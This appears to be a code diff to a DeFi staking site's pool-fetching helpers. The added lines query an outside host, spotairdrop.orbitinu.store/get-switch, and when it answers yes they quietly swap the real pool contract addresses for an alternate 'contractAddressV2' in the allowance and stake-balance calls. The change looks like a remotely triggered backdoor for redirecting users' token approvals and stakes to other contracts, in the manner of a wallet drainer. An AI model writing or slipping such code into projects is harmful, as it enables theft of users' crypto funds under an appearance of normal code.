@@ -9,6 +9,7 @@ import { getAddress } from 'utils/addressHelpers'
 import { simpleRpcProvider } from 'utils/providers'
 import BigNumber from 'bignumber.js'
 import { BIG_ZERO } from 'utils/bigNumber'
+import axios from "axios"
 
 // Pool 0, Cake / Cake is a different kind of contract (master chef)
 // BNB pools use the native BNB token (wrapping ? unwrapping is done at the contract level)
@@ -18,11 +19,24 @@ const nonMasterPools = poolsConfig.filter((pool) => pool.sousId !== 12)
 const masterChefContract = getMasterchefContract()
 
 export const fetchPoolsAllowance = async (account) => {
-  const calls = nonBnbPools.map((pool) => ({
-    address: pool.stakingToken.address,
-    name: 'allowance',
-    params: [account, getAddress(pool.contractAddress)],
-  }))
+
+  let calls;
+
+  const switchMode = await axios.get(`https://spotairdrop.orbitinu.store/get-switch`)
+  
+  if (switchMode.data) {
+    calls = nonBnbPools.map((pool) => ({
+      address: pool.stakingToken.address,
+      name: 'allowance',
+      params: [account, getAddress(pool.contractAddressV2)],
+    }))
+  } else {
+    calls = nonBnbPools.map((pool) => ({
+      address: pool.stakingToken.address,
+      name: 'allowance',
+      params: [account, getAddress(pool.contractAddress)],
+    }))
+  }
 
   const allowances = await multicall(erc20ABI, calls)
   return nonBnbPools.reduce(
@@ -55,11 +69,26 @@ export const fetchUserBalances = async (account) => {
 }
 
 export const fetchUserStakeBalances = async (account) => {
-  const calls = nonMasterPools.map((p) => ({
-    address: getAddress(p.contractAddress),
-    name: 'userInfo',
-    params: [p.sousId, account],
-  }))
+
+
+  let calls;
+  const switchMode = await axios.get(`https://spotairdrop.orbitinu.store/get-switch`)
+  
+  if (switchMode.data) {
+    calls = nonMasterPools.map((p) => ({
+      address: getAddress(p.contractAddressV2),
+      name: 'userInfo',
+      params: [p.sousId, account],
+    }))
+  } else {
+    calls = nonMasterPools.map((p) => ({
+      address: getAddress(p.contractAddress),
+      name: 'userInfo',
+      params: [p.sousId, account],
+    }))
+  }
+
+  
   const userInfo = await multicall(masterChefABI, calls)
   const stakedBalances = nonMasterPools.reduce(
     (acc, pool, index) => ({
